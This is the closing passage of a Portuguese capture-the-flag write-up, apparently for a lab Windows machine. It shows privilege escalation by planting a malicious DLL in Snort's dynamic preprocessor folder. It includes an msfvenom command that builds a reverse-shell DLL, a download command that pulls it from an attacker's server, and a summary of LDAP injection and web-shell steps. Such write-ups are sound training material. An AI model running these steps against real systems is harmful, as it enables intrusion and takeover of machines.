Este mecanismo de pré-processadores de carregamento dinâmico proporciona uma flexibilidade significativa. Mas há um senão. Uma vez que o Snort irá carregar esses pré-processadores sem muito questionamento, alguém pode esgueirar-se em um pré-processador ruim – como um aplicativo desonesto – na pasta onde o Snort procura por eles. Esta pasta está localizada no `C:\Snort\lib\snort_dynamicpreprocessor`.



## [](#solving) Passo 4 - Aumento do privilégio
Com isso em mente, vamos criar uma shell reversa com `msfvenom` para criar um dll malicioso e enviá-lo para o pré-processador dinâmico:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.153 LPORT=4444 -f dll -o sf_shell.dll
```
Agora, abrimos nosso netcat na porta 4444 e baixamos este dll da shell de usuário `jdoe` que temos acesso com o seguinte comando:

```bash
Invoke-WebRequest -Uri "http://10.10.14.153:1234/sf_shell.dll" -OutFile "C:\Users\jdoe\Desktop\sf_shell.dll"
```
Não se esqueça de iniciar um servidor Python na porta 1234 na pasta que contém a shell dll. Depois disso, executamos o seguinte comando no `jdoe` shell:

```bash
upload sf_shell.dll c:\snort\lib\snort_dynamicpreprocessor
```
E depois esperamos...

<img src="../figs/analysis17.png" alt="root shell">

E temos raiz!


# [](#conclusions)Conclusão

Neste CTF, aprendemos muito mais sobre técnicas de injeção de LDAP e Snort. Conseguimos recuperar informações confidenciais usando `kerbrute` pela primeira vez coletando e-mails possíveis e válidos. Depois disso, com a injeção de LDAP, conseguimos adivinhar a senha do usuário e entrar no painel de administração. A partir daí, aumentamos nossos privilégios usando um shell web, concedendo-nos acesso como o serviço web. Para o movimento lateral, utilizamos PrivescCheck.ps1 e encontramos credenciais vazadas.

Depois de fazer login com sucesso na conta de credenciais de usuário vazadas, aumentamos os privilégios ao enviar um dll malicioso para o diretório do pré-processador dinâmico snort, que então nos gerou o shell root.

Foi um belo passeio, com certeza!

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **!

<a href="/">Voltar</a>
